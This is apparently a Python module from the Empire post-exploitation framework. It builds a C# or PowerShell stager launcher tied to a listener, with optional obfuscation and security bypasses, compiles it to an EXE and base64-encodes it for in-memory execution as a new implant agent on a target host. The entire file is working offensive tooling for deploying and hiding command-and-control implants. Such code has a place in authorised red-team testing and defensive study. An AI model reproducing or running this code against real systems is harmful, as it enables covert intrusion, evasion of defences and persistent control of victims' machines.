import base64
import json
from pathlib import Path

from empire.server.common.empire import MainMenu
from empire.server.core.exceptions import (
    ModuleExecutionException,
    ModuleValidationException,
)
from empire.server.core.module_models import EmpireModule
from empire.server.core.module_service import ModuleExecutionRequest


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        listener_name = params["Listener"]
        language = params["Language"].lower()
        user_agent = params["UserAgent"]
        proxy = params["Proxy"]
        proxy_creds = params["ProxyCreds"]
        dot_net_version = params["DotNetVersion"]
        bypasses = params["Bypasses"]

        launcher_obfuscate = str(params.get("Obfuscate", "False")).lower() == "true"

        if language == "csharp":
            exe_path = main_menu.stagergenv2.generate_launcher(
                listener_name,
                language="csharp",
                encode=False,
                obfuscate=launcher_obfuscate,
                obfuscation_command="",
                user_agent=user_agent,
                proxy=proxy,
                proxy_creds=proxy_creds,
                stager_retries="0",
                bypasses=bypasses,
            )

        elif language == "powershell":
            launcher_obfuscate_command = params.get("ObfuscateCommand", r"Token\All\1")

            ps_launcher = main_menu.stagergenv2.generate_launcher(
                listener_name,
                language="powershell",
                encode=False,
                obfuscate=launcher_obfuscate,
                obfuscation_command=launcher_obfuscate_command,
                user_agent=user_agent,
                proxy=proxy,
                proxy_creds=proxy_creds,
                stager_retries="0",
                bypasses=bypasses,
            )
            exe_path = main_menu.stagergenv2.generate_powershell_exe(
                ps_launcher,
                dot_net_version=dot_net_version,
                obfuscate=launcher_obfuscate,
            )

        else:
            # Cannot do IronPython because the assembly is too large to launch in this method
            raise ModuleValidationException(
                "[!] Invalid Language. Choose: powershell or csharp."
            )

        if not exe_path or exe_path == "" or str(exe_path).lower() == "failed":
            raise ModuleValidationException("[!] Error generating launcher EXE.")

        assembly_bytes = Path(exe_path).read_bytes()
        base64_assembly = base64.b64encode(assembly_bytes).decode("utf-8")

        assembly_module = main_menu.modulesv2.get_by_id(
            "csharp_code_execution_assembly"
        )
        if assembly_module is None:
            raise ModuleExecutionException("[!] Could not find the Assembly module.")

        script_file = main_menu.dotnet_compiler.compile_task(
            assembly_module.compiler_yaml,
            assembly_module.name,
            dot_net_version=dot_net_version.lower(),
            confuse=False,
        )

        filtered_params = {
            "File": base64_assembly,
            "Parameters": "",
        }

        param_json = json.dumps(filtered_params)
        base64_json = base64.b64encode(param_json.encode("utf-8")).decode("utf-8")

        return ModuleExecutionRequest(
            command="",
            data=f"{script_file}|,{base64_json}",
            files=[script_file],
        )
